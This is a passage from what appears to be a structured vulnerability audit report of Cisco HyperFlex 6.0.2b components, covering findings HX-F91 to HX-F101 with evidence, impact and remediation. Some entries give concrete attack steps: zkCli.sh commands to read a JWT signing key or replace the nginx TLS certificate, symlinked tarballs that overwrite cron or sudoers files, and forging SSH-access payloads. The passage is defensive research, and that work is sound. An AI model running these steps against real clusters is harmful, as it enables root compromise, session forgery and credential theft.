            "Replace Base64 with AES-GCM encryption using the StorvisorKeystore key (see HX-F41) "
            "for all credential fields before writing to temporary files or passing to deployment scripts. "
            "Write temporary credential files with mode 0600 (owner-only). "
            "Pass credentials via environment variables or a secure IPC channel instead of CLI arguments "
            "to avoid /proc/pid/cmdline exposure. "
            "Ensure cleanup runs in a finally block to guarantee deletion even on exception paths."
        ),
    },
    "HX-F91": {
        "title": (
            "connector_ctl backup Produces Unencrypted Tarball of connector.db "
            "Containing Intersight AccessKeyId and AccessKey — Planned Encryption Not Implemented"
        ),
        "severity": "HIGH",
        "cvss": "6.5",
        "cwe": "CWE-312",
        "component": (
            "hxdp Intersight Device Connector / connector_ctl backup operation / "
            "connector.db SQLite database at <install-location>/db/connector.db"
        ),
        "class": "Cleartext Storage of Sensitive Information — Incomplete Security Control Implementation",
        "confirmed": True,
        "evidence": {
            "backup_command": (
                "connector_ctl backup <install-location> <target-dir>: "
                "Line 42: 'tar -czf $3/connector.tgz $2/db/connector.db'. "
                "Produces unencrypted gzip tarball of connector.db. "
                "Line 44: '# TODO - encrypt pkg' — encryption was planned but not implemented."
            ),
            "credential_scope": (
                "connector.db contains Intersight cloud management API credentials: "
                "AccessKeyId and AccessKey (Intersight API key pair). "
                "Confirmed by tech_support operation (line 23-24): "
                "'sed /AccessKeyId/d $3/connector.db > ... && sed /AccessKey/d $3/connector.db > ...' "
                "which explicitly strips these fields from tech-support output — "
                "confirming their presence and sensitivity."
            ),
            "contrast_with_tech_support": (
                "tech_support operation redacts AccessKeyId and AccessKey before copying. "
                "backup operation copies connector.db WITHOUT redaction or encryption. "
                "The asymmetry indicates the developer recognized credential sensitivity "
                "for tech-support bundles but left the backup path unprotected."
            ),
            "backup_location": (
                "Backup written to $3/connector.tgz where $3 is caller-supplied target directory. "
                "No access controls enforced on the output tarball."
            ),
        },
        "impact": (
            "Any user or process with read access to the backup target directory can extract "
            "connector.tgz and recover Intersight API credentials (AccessKeyId + AccessKey) in plaintext. "
            "Intersight API access enables full remote management plane control: "
            "cluster configuration, firmware upgrade orchestration, policy enforcement, "
            "and potentially pivoting to other Cisco-managed infrastructure registered with the same Intersight account. "
            "Backups are likely written to NFS-mounted shared storage (/nfs/SYSTEM/) accessible to all cluster nodes."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Implement the planned encryption for backup tarballs — use AES-GCM with a key derived "
            "from the StorvisorKeystore (see HX-F41) or a cluster-unique backup key. "
            "As an interim measure, redact AccessKeyId and AccessKey from the backup using the same "
            "sed filtering already implemented for tech_support output. "
            "Set restrictive permissions (0600) on the output tarball. "
            "Remove the TODO comment and enforce the security control before release."
        ),
    },
    "HX-F92": {
        "title": (
            "connector_ctl restore Extracts Untrusted Tarball Directly to Filesystem Root "
            "with No Integrity Verification — Arbitrary File Write via Crafted Tarball"
        ),
        "severity": "HIGH",
        "cvss": "7.8",
        "cwe": "CWE-22",
        "component": (
            "hxdp Intersight Device Connector / connector_ctl restore operation / "
            "tar extraction to -C / (filesystem root)"
        ),
        "class": "Path Traversal via Unsafe Archive Extraction — Arbitrary File Write",
        "confirmed": True,
        "evidence": {
            "restore_command": (
                "connector_ctl restore <install-location> <source-config>: "
                "Line 62: 'tar xzf $3 -C /'. "
                "Extracts the caller-supplied tarball ($3) directly to the filesystem root (/). "
                "No integrity check (no signature, no HMAC, no hash comparison). "
                "No path sanitization of tarball entries before extraction."
            ),
            "no_decryption": (
                "Line 58: '# TODO - decrypt'. "
                "Decryption was planned but not implemented — confirming the TODO in backup/restore pair. "
                "Absence of decryption means any tarball is accepted regardless of origin."
            ),
            "path_traversal_vector": (
                "GNU tar with -C / extracts entries relative to /. "
                "Tarball entries with symlinks (e.g., 'db -> /etc/cron.d') redirect subsequent "
                "file writes to arbitrary filesystem paths. "
                "Absolute-path entries are stripped by default but symlink-based traversal "
                "(tar CVE-2007-4131 class) survives. "
                "Combined with lack of integrity check: attacker supplies crafted connector.tgz "
                "containing symlink entries to overwrite /etc/cron.d/*, /etc/sudoers.d/*, "
                "or connector binary at /opt/partner/cisco-hxdc-run/hxdc_latest/hxdp."
            ),
            "unquoted_variable": (
                "Line 62: 'tar xzf $3 -C /' — $3 is unquoted. "
                "Path containing spaces or shell metacharacters causes unpredictable behavior or injection."
            ),
        },
        "impact": (
            "An attacker who can supply a crafted tarball to connector_ctl restore "
            "(via backup/restore Thrift RPC, NFS path manipulation, or post-initial-access file write) "
            "can write arbitrary files to the root filesystem. "
            "Overwriting /opt/partner/cisco-hxdc-run/hxdc_latest/hxdp replaces the connector binary "
            "executed by upstart — local root or persistent backdoor. "
            "Overwriting /etc/cron.d/ achieves code execution as root on next cron cycle. "
            "All cluster nodes run the same connector and may be vulnerable simultaneously."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Implement the planned decryption and add HMAC-SHA256 signature verification "
            "before tarball extraction. "
            "Validate all tarball entry paths against an allowlist (e.g., only "
            "./db/connector.db and no symlinks) before extraction. "
            "Quote all shell variables in connector_ctl to prevent word-splitting/globbing injection. "
            "Use tar --no-overwrite-dir --no-same-permissions and verify entry count matches expected."
        ),
    },
    "HX-F93": {
        "title": (
            "StNodeMgrImpl.sessionToken Initialized via Shell Execution of "
            "'cat /etc/hyperflex/secure/root_file.pub' — Static Fallback "
            "'invalid-token' Used When File Is Absent or Unreadable"
        ),
        "severity": "MEDIUM",
        "cvss": "5.3",
        "cwe": "CWE-287",
        "component": (
            "stnodemgr / StNodeMgrImpl / sessionToken lazy val / "
            "$anonfun$sessionToken$1 / $anonfun$sessionToken$2 — "
            "inter-service authentication token initialization"
        ),
        "class": "Improper Authentication — Predictable Static Fallback Token",
        "confirmed": True,
        "evidence": {
            "sessionToken_init": (
                "StNodeMgrImpl constructor at offset 169: "
                "scala.util.Try { $anonfun$sessionToken$1() }.toOption.getOrElse(\"invalid-token\"). "
                "$anonfun$sessionToken$1: scala.sys.process.stringToProcess("
                "\"cat /etc/hyperflex/secure/root_file.pub\").!!.trim — "
                "executes cat via shell and uses stdout as the token. "
                "$anonfun$sessionToken$2: returns literal String \"invalid-token\" on any exception "
                "(FileNotFoundException, PermissionDenied, IOException, ProcessException). "
                "Result stored in private final field sessionToken (field #927) at constructor offset 169."
            ),
            "fallback_literal": (
                "The fallback string \"invalid-token\" is a fixed literal, not randomly generated. "
                "If /etc/hyperflex/secure/root_file.pub is absent, unreadable, or the cat command "
                "fails for any reason, all outbound inter-service calls from stNodeMgr carry "
                "the predictable token \"invalid-token\"."
            ),
            "file_semantics": (
                "The source file is /etc/hyperflex/secure/root_file.pub — .pub extension indicates "
                "an RSA or EC public key. Using a public key as a shared authentication token "
                "is a design flaw: the file is intended to be non-secret (public keys are shareable), "
                "but treating its content as a bearer credential contradicts that expectation. "
                "Attacker with any filesystem read capability can extract the token value directly."
            ),
            "shell_execution": (
                "Token is obtained via scala.sys.process.stringToProcess(\"cat <path>\").!! — "
                "single-argument string form which splits on whitespace and executes via "
                "ProcessBuilder, not via Runtime.exec(String) single-string (shell) form. "
                "No injection risk in this specific call since the path is hardcoded, "
                "but the process execution adds startup latency and failure modes not present "
                "with direct File.readAllBytes()."
            ),
            "port_init": (
                "Companion lazy val port$1: bash -c "
                "'cat /usr/share/hyperflex/storfs-misc/restintport.cfg | grep PORT' parsed on '=' -> index 1. "
                "Fallback port$2: '8997'. "
                "Companion lazy val cip$1: bash -c "
                "'cat /etc/hyperflex/storfs.cfg | grep clusterIp' parsed on '=' -> index 1. "
                "Fallback cip$2: 'localhost'. "
                "All three (cip, port, sessionToken) are used together to make outbound calls "
                "to the stmgr REST API at <clusterIp>:8997 using sessionToken as auth credential."
            ),
        },
        "impact": (
            "If /etc/hyperflex/secure/root_file.pub is absent (fresh node, failed deployment, "
            "or intentional deletion), all stNodeMgr outbound calls to other cluster services "
            "carry the static token 'invalid-token'. "
            "A service that validates tokens via string equality rather than cryptographic "
            "verification would accept this known value from any caller. "
            "Additionally, the public key file (/etc/hyperflex/secure/root_file.pub) used as "
            "a shared authentication secret is readable by any process with filesystem access, "
            "meaning the actual token value (when the file exists) is also obtainable by a "
            "local attacker without root privileges."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace the file-content bearer token with a proper inter-service authentication "
            "mechanism (mTLS, signed JWT, or Finagle built-in token validation). "
            "If file-based tokens must be retained, use a private key or a dedicated secret "
            "file (not a .pub file) and read it with Java file I/O, not via shell cat. "
            "Remove the 'invalid-token' fallback — service should fail-fast rather than "
            "operate with a known-static credential on auth failure."
        ),
    },
    "HX-F94": {
        "title": (
            "ServiceAccessAuthFilterImpl.doFilter Always Calls chain.doFilter — "
            "Missing X-ServiceAccessToken Header and Failed Token Validation "
            "Both Pass Unauthenticated Requests to Downstream Filter Chain"
        ),
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-306",
        "component": (
            "authfilter / ServiceAccessAuthFilterImpl / doFilter / "
            "service-to-service authentication gate"
        ),
        "class": "Missing Authentication for Critical Function — Service Access Token Not Enforced",
        "confirmed": True,
        "evidence": {
            "doFilter_bypass_empty_token": (
                "ServiceAccessAuthFilterImpl.doFilter offset 111-184: "
                "token = getHeaderValue(\"X-ServiceAccessToken\"); "
                "offset 119-124: if (StringUtils.isEmpty(token)) goto 184; "
                "offset 184-187: chain.doFilter(req, resp). "
                "When X-ServiceAccessToken header is absent or empty, "
                "execution jumps directly to chain.doFilter — "
                "the request is forwarded without any authentication."
            ),
            "doFilter_bypass_invalid_token": (
                "doFilter offset 127-165: "
                "jwt = SSOManager.validateServiceAccessToken(token.trim()); "
                "offset 137-139: if (jwt == null) goto 153; "
                "offset 153-164: log debug message; goto 184; "
                "offset 184: chain.doFilter(req, resp). "
                "When X-ServiceAccessToken is present but validation fails "
                "(validateServiceAccessToken returns null), filter logs and "
                "then forwards to chain.doFilter — no 401/403 response."
            ),
            "no_rejection_path": (
                "Full doFilter analysis: the filter contains no code path "
                "that calls response.sendError() or response.setStatus(401/403). "
                "Both token-absent (offset 124->184) and token-invalid (offset 153->184) "
                "terminate at the same chain.doFilter call at offset 184. "
                "Only path that blocks: if Authenticated=True AND "
                "validateClientIdIfPresent() returns false (offset 75->86->106 return without chain.doFilter). "
                "The unauthenticated path has no blocking capability."
            ),
            "http_enabled": (
                "authfilter/application.conf: hxSvcHttpEnabled=true, hyperVSvcHttpEnabled=true. "
                "Service-to-service communication allowed over plaintext HTTP, "
                "not requiring TLS. "
                "Combined with the non-enforcing filter: any HTTP client can "
                "reach service access endpoints without credentials."
            ),
        },
        "impact": (
            "Any client that can reach service-access endpoints (internal network, "
            "or external if port-exposed) can invoke service-access operations "
            "without providing an X-ServiceAccessToken. "
            "The filter never produces a 401/403 response on the service access path — "
            "it only enriches the request attributes on successful validation. "
            "Downstream handlers receive requests with no Authenticated attribute set "
            "and must independently enforce auth (if they do at all). "
            "Combined with hxSvcHttpEnabled=true, plaintext HTTP probes "
            "can exercise service-access endpoints without TLS."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace the passthrough pattern with an enforcement pattern: "
            "when X-ServiceAccessToken is absent or validateServiceAccessToken returns null, "
            "call response.sendError(HttpServletResponse.SC_UNAUTHORIZED) and return — "
            "do NOT call chain.doFilter(). "
            "Set hxSvcHttpEnabled=false and hyperVSvcHttpEnabled=false to require TLS "
            "for all inter-service communication."
        ),
    },
    "HX-F95": {
        "title": (
            "HXPasswordMonitor Syncs System Passwords from ZooKeeper Path /user_credentials "
            "for root/admin/diag Accounts — ZK Write Without Verified ACL Enforcement "
            "Enables Unauthenticated Cluster-Wide Password Reset"
        ),
        "severity": "CRITICAL",
        "cvss": "9.8",
        "cwe": "CWE-284",
        "component": (
            "hxSecuritySvcMgr / HXPasswordMonitor / PasswordOperations.setPasswordsFromZK / "
            "setSystemPassword / /opt/hyperflex/setpasswd.sh — "
            "ZooKeeper-triggered system account password synchronization"
        ),
        "class": "Improper Access Control — Unauthenticated ZK Write Triggers System Password Reset",
        "confirmed": True,
        "evidence": {
            "zk_watcher_trigger": (
                "HXPasswordMonitor constructor at offset 14-26: "
                "zkClient.registerNodeCacheListenerForPath(ZK_PATH, lambda). "
                "ZK_PATH = ApplicationConstants.passwordZkPath = "
                "configured as 'sysmgmt.password.zkPath' from application.conf: '/user_credentials'. "
                "Curator NodeCache watcher fires lambda$new$0 on any data change at /user_credentials."
            ),
            "lambda_trigger_chain": (
                "lambda$new$0 at offset 0-44: "
                "1. data = zkClient.getDataInPath('/user_credentials', Type<String>); "
                "2. ops = new PasswordOperations(new CommandRunner()); "
                "3. ops.setPasswordsFromZK(data). "
                "No authentication check on the ZK data source before processing."
            ),
            "setPasswordsFromZK_flow": (
                "PasswordOperations.setPasswordsFromZK(String zkData) at offset 0-45: "
                "1. localShadow = readSPShadowFile() — reads local springpath shadow file; "
                "2. if (zkData.equals(localShadow)) return (no-op if unchanged); "
                "3. creds = mapCredentialsString(zkData) — parses ZK data into username->hash map; "
                "4. setSystemPasswords(creds) — applies each credential pair."
            ),
            "setSystemPassword_exec": (
                "setSystemPassword(String username, String password): "
                "String[] cmd = [\"/opt/hyperflex/setpasswd.sh\", username, password]; "
                "runner.run(cmd, 10000). "
                "CommandRunner executes via String[] (no shell expansion). "
                "Executed for each entry in the credential map from ZK data."
            ),
            "sync_scope": (
                "application.conf: password.syncEnabled=true, "
                "password.syncAccounts=[\"root\", \"admin\", \"diag\"]. "
                "All three privileged accounts are within the synchronization scope. "
                "Successful ZK write to /user_credentials results in simultaneous "
                "password reset for root, admin, and diag across affected nodes."
            ),
            "zk_access_model": (
                "check_zk.sh confirms ZK port 2181 accepts unauthenticated four-letter word commands "
                "(echo srvr|nc $zks 2181, echo cons|nc $zks 2181, echo dump|nc $LEADER 2181) "
                "without any authentication. "
                "Default ZK ACL is world:anyone:cdrwa (full read+write for unauthenticated clients). "
                "ZK SASL/Digest authentication is not confirmed configured for the HyperFlex ZK ensemble. "
                "Exploitability depends on whether /user_credentials has restrictive ACLs set "
                "at provisioning time — this is not confirmed from static analysis."
            ),
        },
        "impact": (
            "If ZK ACLs on /user_credentials are not restricted: "
            "unauthenticated attacker reaching ZK port 2181 can write crafted credential data, "
            "triggering HXPasswordMonitor to call setPasswords via /opt/hyperflex/setpasswd.sh "
            "for root, admin, and diag accounts. "
            "Attack surface: ZK 2181 is an internal cluster port but may be reachable from "
            "compromised HyperFlex node, guest VM on storage network, or misconfigured firewall. "
            "Impact: cluster-wide root account compromise across all stCtlVM nodes "
            "using Curator's ServiceDiscovery (all nodes share the same ZK ensemble)."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Set ZK ACLs on /user_credentials to restrict writes to authenticated ZK sessions "
            "used by the security service only (Digest or SASL auth). "
            "Enable ZK requireClientAuthScheme=sasl or digest on the HyperFlex ZK ensemble. "
            "Add an integrity check in setPasswordsFromZK: verify ZK data is signed by "
            "a key known only to the security service before applying to system accounts. "
            "Restrict ZK port 2181 to localhost or HyperFlex management VLAN only via firewall rules."
        ),
    },
    "HX-F96": {
        "title": (
            "HxSecureShellMain Uses AES/ECB with Cluster UUID as Encryption Key — "
            "ECB Mode Leaks Block Patterns and Cluster UUID Is Observable "
            "via Multiple Unauthenticated Interfaces"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-327",
        "component": (
            "hxSecuritySvcMgr / HxSecureShellMain.setMetaData / BasicEncryptionUtil / "
            "AES/ECB/PKCS5Padding — SSH support access metadata encryption"
        ),
        "class": "Use of Weak Cryptographic Algorithm — AES/ECB with Predictable Key",
        "confirmed": True,
        "evidence": {
            "ecb_mode": (
                "BasicEncryptionUtil.encrypt/decrypt offset 33-35: "
                "Cipher.getInstance(\"AES/ECB/PKCS5Padding\"). "
                "ECB mode applies AES independently to each 16-byte block — "
                "identical plaintext blocks produce identical ciphertext blocks. "
                "No IV or nonce is used. Encryption is deterministic. "
                "Block pattern leakage allows structural analysis of encrypted data "
                "without knowledge of the key."
            ),
            "key_is_cluster_uuid": (
                "HxSecureShellMain.setMetaData() at offset 0-4: "
                "clusterUuid = getClusterUuid(); // local var #2. "
                "At offset 47-48: BasicEncryptionUtil.decrypt(callerData, clusterUuid). "
                "At offset 142-143: BasicEncryptionUtil.encrypt(reconstructedData, clusterUuid). "
                "The AES key is SHA-256(clusterUUID.getBytes('UTF-8')) via getKeySpec(). "
                "The cluster UUID is the sole key material — not a secret."
            ),
            "key_observability": (
                "Cluster UUID is visible via: "
                "(1) GET /rest/v1/cluster — unauthenticated in HX versions <4.5; "
                "(2) ZooKeeper /storvisor/clusterConfig or /storvisor/platform nodes — "
                "readable by unauthenticated ZK clients; "
                "(3) Intersight cloud telemetry; "
                "(4) HX Connect UI (authenticated); "
                "(5) support bundles and ASUP data. "
                "An attacker with any of these access paths obtains the encryption key."
            ),
            "use_context": (
                "setMetaData(String encryptedCallerData): "
                "1. Decrypts caller-supplied encrypted data using clusterUUID as key; "
                "2. Validates decrypted value is a valid IP address; "
                "3. Appends timeoutMillis: data = ip + ':' + timeout; "
                "4. Re-encrypts with clusterUUID; "
                "5. writeMetaToFile(encrypted); "
                "6. execSecureShellCmd() -> /usr/share/secureshell-config/config_ssh.sh. "
                "This is the TAC remote support access mechanism: "
                "SWIMS sends an encrypted IP, service decrypts and grants SSH access for that IP. "
                "An attacker with the cluster UUID can forge the encrypted IP payload and "
                "grant SSH access to an attacker-controlled IP without Cisco TAC involvement."
            ),
        },
        "impact": (
            "Attacker who obtains the cluster UUID (via unauthenticated /rest/v1/cluster, ZK, "
            "or ASUP data) can: "
            "1. Decrypt SSH support session metadata to determine which IPs have active TAC access; "
            "2. Forge a valid encrypted payload for setMetaData() containing an attacker IP, "
            "triggering config_ssh.sh to authorize SSH access from that IP; "
            "3. Effectively bypass the Cisco TAC access control mechanism and "
            "self-authorize SSH access to the HyperFlex controller."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace AES/ECB with AES/GCM (authenticated encryption) to prevent pattern leakage "
            "and add integrity protection. "
            "Replace cluster UUID as key with a dedicated secret not derivable from observable system state — "
            "use a node-specific secret stored in /etc/hyperflex/secure/ with restricted permissions. "
            "Add HMAC signature verification on the caller-supplied payload before decryption "
            "to prevent forged setMetaData requests."
        ),
    },
    "HX-F97": {
        "title": (
            "HXStigZKMonitor Executes apply_stig_current_node.py with ZooKeeper-Controlled "
            "Argument via Runtime.exec(String) — Unauthenticated ZK Write Disables STIG "
            "Compliance on ESXi and VM Nodes"
        ),
        "severity": "MEDIUM",
        "cvss": "6.5",
        "cwe": "CWE-284",
        "component": (
            "hxSecuritySvcMgr / HXStigZKMonitor / applyStig / "
            "/opt/hyperflex/storfs-stig/apply_stig_current_node.py"
        ),
        "class": "Unauthenticated ZK Write Triggers Privileged Script with Attacker-Controlled Argument",
        "confirmed": True,
        "evidence": {
            "zk_watcher_setup": (
                "HXStigZKMonitor constructor: "
                "registerNodeCacheListenerForPath('/stig/esxi/isEnabled', lambda1); "
                "registerNodeCacheListenerForPath('/stig/vm/isEnabled', lambda2). "
                "Both NodeCache watchers call applyStig(zkData) on any ZK node change."
            ),
            "applyStig_exec": (
                "applyStig(String zkData) at offsets 16-33: "
                "scriptPath = '/opt/hyperflex/storfs-stig/apply_stig_current_node.py'; "
                "cmd = scriptPath + ' ' + zkData;  // String concatenation "
                "Process p = Runtime.getRuntime().exec(cmd);  // exec(String) - whitespace tokenization. "
                "Runtime.exec(String) does NOT invoke /bin/sh; splits on whitespace via StringTokenizer. "
                "Shell metacharacters (;, |, &&) are passed as literal args to the Python script. "
                "ZK data becomes argument(s) to the script."
            ),
            "impact_scope": (
                "Default ZK ACL world:anyone:cdrwa allows unauthenticated write. "
                "Attacker writes 'false' to /stig/esxi/isEnabled → script invoked with arg 'false'. "
                "Script is expected to disable STIG hardening for ESXi nodes. "
                "If apply_stig_current_node.py uses shell=True internally with sys.argv[1], "
                "shell injection is also possible — Python script source not available for confirmation."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Set ZK ACL on /stig/ path subtree to restrict writes to authenticated ZK sessions only. "
            "Validate ZK data against an allowlist ('true'/'false') before passing to the script. "
            "Replace Runtime.exec(String) with ProcessBuilder(['script', validatedArg]) "
            "to prevent tokenization ambiguity."
        ),
    },
    "HX-F98": {
        "title": (
            "HXCertificateZKMonitor Overwrites NGINX TLS Certificate and Private Key from "
            "ZooKeeper Path /certificates/hxcertificate — Unauthenticated ZK Write Enables "
            "MITM of All HTTPS Management Traffic with Explicit SFI Suppression"
        ),
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-284",
        "component": (
            "hxSecuritySvcMgr / HXCertificateZKMonitor / writeSslCert + writeSslKey + restartNginx / "
            "/etc/nginx/server.crt + /etc/nginx/server.key"
        ),
        "class": "Unauthenticated ZK Write Replaces nginx TLS Cert/Key + Suppresses Integrity Check",
        "confirmed": True,
        "evidence": {
            "zk_watcher_setup": (
                "HXCertificateZKMonitor.registerNodeCacheListener(): "
                "zkClient.registerNodeCacheListenerForPath('/certificates/hxcertificate', $1). "
                "NodeCache watcher fires on any ZK data change to /certificates/hxcertificate."
            ),
            "nodeChanged_chain": (
                "HXCertificateZKMonitor$1.nodeChanged() at offset 28-87: "
                "zkClient.getDataInPath('/certificates/hxcertificate', Type<HxCertificate>) -> hxCert; "
                "writeSslCert(hxCert.getCertificateString()); "
                "writeSslKey(hxCert.getPrivateKeyString()); "
                "restartNginx()."
            ),
            "writeSslCert_direct_write": (
                "writeSslCert(String) at offsets 0-56: "
                "File(NGINX_CERT_PATH).setReadable(true, false); "
                "PrintWriter(NGINX_CERT_PATH, 'UTF-8').print(zkData); // direct unvalidated write "
                "NGINX_CERT_PATH = '/etc/nginx/server.crt' (from application.conf nginx.CertificatePath)."
            ),
            "writeSslKey_direct_write": (
                "writeSslKey(String): analogous to writeSslCert. "
                "NGINX_KEY_PATH = '/etc/nginx/server.key' (from application.conf nginx.PrivateKeyPath)."
            ),
            "sfi_suppression": (
                "After restartNginx() at offset 90: "
                "logger.warn('Supressed SFI - Baseline Update for System File Integrity is Skipped!'). "
                "System File Integrity monitoring is explicitly bypassed after cert/key write — "
                "replacement is not flagged by integrity monitoring."
            ),
            "zk_access_model": (
                "Default ZK ACL: world:anyone:cdrwa. "
                "ZK port 2181 unauthenticated (confirmed in application.conf: defaultConnectionString='localhost:2181'). "
                "HX-F95 confirms ZK listens on cluster IP with no mandatory auth."
            ),
            "exploit_scenario": (
                "Attacker with ZK write access (port 2181, no auth required by default): "
                "1. Construct HxCertificate JSON with attacker-controlled cert+key strings; "
                "2. zkCli.sh -server <clusterIP>:2181 set /certificates/hxcertificate '<json>'; "
                "3. NodeCache watcher fires; nginx cert/key replaced; nginx restarted; SFI suppressed; "
                "4. All HTTPS traffic to HyperFlex management (port 443) is now MITM-able. "
                "5. Attacker-controlled cert in place — login credentials harvested from HX Connect."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Set ZK ACL on /certificates/ subtree to restrict writes to authenticated sessions only. "
            "Do not accept raw cert/key material from ZK without signature verification by a trusted CA. "
            "Replace direct PrintWriter write with a CA-signed certificate rotation workflow. "
            "Do not suppress SFI — cert changes must trigger an integrity baseline update, not skip it."
        ),
    },
    "HX-F99": {
        "title": (
            "HXPasswordPolicyMonitor Applies Password Aging Policy from ZooKeeper Path "
            "/apl/passwordPolicy/clusterPasswordPolicy — Unauthenticated ZK Write "
            "Weakens Password Policy for admin and diag Accounts"
        ),
        "severity": "MEDIUM",
        "cvss": "5.3",
        "cwe": "CWE-284",
        "component": (
            "hxSecuritySvcMgr / HXPasswordPolicyMonitor / setPwMinDays / chage / "
            "/apl/passwordPolicy/clusterPasswordPolicy"
        ),
        "class": "Unauthenticated ZK Write Modifies PAM Password Policy via chage",
        "confirmed": True,
        "evidence": {
            "zk_watcher_setup": (
                "HXPasswordPolicyMonitor constructor: "
                "zkClient.registerNodeCacheListenerForPath(ZK_PATH, lambda). "
                "ZK_PATH = '/apl/passwordPolicy/clusterPasswordPolicy' "
                "(from application.conf passwordPolicy.passwordPolicyZkPath)."
            ),
            "setPwMinDays_exec": (
                "setPwMinDays(int days): "
                "CHAGE_CMD_TEMPLATE = 'chage -m %d %s' (from application.conf chageCmdTemplate). "
                "For each user in USERS=[admin, diag]: "
                "cmd = String.format(template, days, username).split(' '); "
                "exec(String[]) - safe array form, no injection."
            ),
            "impact": (
                "ZK data is parsed as JSON password policy object (Gson TYPE). "
                "Attacker writes JSON setting minDays=0 or maxDays=99999 "
                "to /apl/passwordPolicy/clusterPasswordPolicy. "
                "Password aging (chage -m) for admin and diag accounts is set to attacker-controlled value. "
                "Also modifies /etc/pam.d/common-password "
                "(PAM_CONF_PATH = application.conf passwordPolicy.commonPasswordPamConfPath). "
                "Weakens complexity/history enforcement across all local accounts."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Set ZK ACL on /apl/passwordPolicy/ to restrict writes to authenticated sessions. "
            "Validate parsed policy values against minimum acceptable thresholds before applying. "
            "Alert/log when password policy values are weakened below baseline."
        ),
    },
    "HX-F100": {
        "title": (
            "AAAStoreZKPersistAgent Stores JWT Signing Key in ZooKeeper at "
            "/rest/aaa/jwt_signing_key — Unauthenticated ZK Read Enables "
            "Forging of Arbitrary Session Tokens for Any HyperFlex User"
        ),
        "severity": "CRITICAL",
        "cvss": "9.8",
        "cwe": "CWE-321",
        "component": (
            "hx-aaa / AAAStoreZKPersistAgent / fetchJWTSigningKey / ZooKeeperStore / "
            "/rest/aaa/jwt_signing_key"
        ),
        "class": "JWT Signing Key in Unauthenticated ZooKeeper — Full Session Forgery",
        "confirmed": True,
        "evidence": {
            "zk_path": (
                "AAAStoreZKPersistAgent constructor at offsets 24-27: "
                "AAAJWTSigningKey = '/rest/aaa/jwt_signing_key'. "
                "fetchJWTSigningKey() at offset 33: "
                "ZooKeeperStore.getValueVersionPairForKey('/rest/aaa/jwt_signing_key', Type<String>). "
                "Returns the signing key string directly from ZK."
            ),
            "fetchJWTSigningKey_flow": (
                "fetchJWTSigningKey() offsets 12-63: "
                "new ZooKeeperStore() -> .getValueVersionPairForKey('/rest/aaa/jwt_signing_key', type); "
                "if (pair != null) return (String) pair.getFirst(). "
                "No authentication before the ZK read. "
                "No encryption of the key at rest in ZK."
            ),
            "session_table_exposure": (
                "AAASessionTablePath = '/rest/aaa/session_table'. "
                "insertSession()/lookupAccessToken()/invalidateAccessToken() all operate on this path. "
                "Active session access tokens for all logged-in users are stored in the same ZK namespace. "
                "Unauthenticated ZK read exposes all active HyperFlex sessions."
            ),
            "failed_logins_exposure": (
                "AAAFailedLoginsTablePath = '/rest/aaa/failed_logins_table'. "
                "lookupFailedLogin()/updateFailedLogin()/removeFailedLogin() operate on this path. "
                "Failed login state per user readable/writable from unauthenticated ZK. "
                "Attacker can clear failed login counters to bypass lockout."
            ),
            "zk_access_model": (
                "Default ZK ACL: world:anyone:cdrwa. "
                "ZK port 2181 confirmed unauthenticated in application.conf (HX-F95 evidence). "
                "No ZK authentication required to read /rest/aaa/jwt_signing_key."
            ),
            "exploit_scenario": (
                "1. Read JWT signing key: "
                "zkCli.sh -server <clusterIP>:2181 get /rest/aaa/jwt_signing_key; "
                "2. Forge a JWT for 'admin' with any desired claims; "
                "3. Use forged JWT as Bearer token against HyperFlex REST API on port 443; "
                "4. Full unauthenticated admin access to cluster management, data, and configuration. "
                "Alternatively: read /rest/aaa/session_table to harvest active admin sessions without "
                "needing the signing key."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Never store JWT signing keys in ZooKeeper without authenticated ACLs. "
            "Move the JWT signing key to a secrets store (e.g., /etc/hyperflex/secure/) "
            "with filesystem permissions 0600 root:root, loaded at service startup. "
            "Set ZK Digest or SASL ACLs on all /rest/aaa/ paths. "
            "Rotate the JWT signing key immediately on any ZK exposure."
        ),
    },
    "HX-F101": {
        "title": (
            "stSSOMgr Stores AES Encryption Key and Encrypted Hyper-V Credentials "
            "in the Same ZooKeeper Namespace — Unauthenticated Read Recovers "
            "Plaintext Hyper-V Domain Credentials"
        ),
        "severity": "HIGH",
        "cvss": "8.1",
        "cwe": "CWE-321",
        "component": (
            "stSSOMgr / StSSOMgrImpl / getEncryptionKeyFromZK / setHypervHostCreds / "
            "ZkPersistenceManager / zkBasePath/zkAuthKey/zkEncryptionKey"
        ),
        "class": "Encryption Key and Ciphertext Co-Located in Unauthenticated ZooKeeper",
        "confirmed": True,
        "evidence": {
            "key_generation_and_storage": (
                "StSSOMgrImpl.$anonfun$getEncryptionKeyFromZK$3 at offsets 12-49: "
                "key = EncryptionUtil$.generateSecretKey(); "
                "b64Key = Base64.encodeBase64String(key.getEncoded()); "
                "getZkPmInstance().write(zkAuthKey, zkEncryptionKey, b64Key, -1L). "
                "On ZK read failure (first run), a new SecretKey is generated and written to ZK. "
                "Config keys: sysmgmt.stSSOMgr.zkBasePath, sysmgmt.stSSOMgr.zkAuthKey, "
                "sysmgmt.stSSOMgr.zkEncryptionKey."
            ),
            "creds_storage": (
                "StSSOMgrImpl.$anonfun$setHypervHostCreds$3 at offsets 79-87: "
                "encryptedCreds = EncryptionUtil$.encryptData(hypervCreds, secretKey); "
                "written to ZK at path zkBasePath/zkAuthKey/zkCredsKey. "
                "Config key: sysmgmt.stSSOMgr.zkCredsKey."
            ),
            "recovery_attack": (
                "Attacker reads: "
                "(1) {zkBasePath}/{zkAuthKey}/{zkEncryptionKey} -> Base64 AES key; "
                "(2) {zkBasePath}/{zkAuthKey}/{zkCredsKey} -> encrypted Hyper-V credentials. "
